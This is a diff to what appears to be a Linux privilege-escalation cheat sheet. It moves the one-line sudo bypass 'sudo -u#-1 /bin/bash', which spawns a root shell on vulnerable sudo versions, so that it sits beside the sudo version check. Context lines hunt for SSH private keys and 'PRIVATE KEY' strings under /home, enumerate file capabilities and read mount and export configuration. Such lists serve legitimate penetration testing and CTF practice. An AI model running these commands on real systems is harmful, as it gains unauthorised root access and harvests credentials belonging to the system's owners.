@@ -12,6 +12,7 @@ history
 sudo -l
 
 sudo -V | grep version
+sudo -u#-1 /bin/bash
 
 find / -name id_rsa 2>/dev/null
 grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
@@ -32,8 +33,6 @@ getcap -r / 2>/dev/null
 
 cat /etc/exports
 cat /etc/fstab
-
-sudo -u#-1 /bin/bash
 
 ip a
 ifconfig
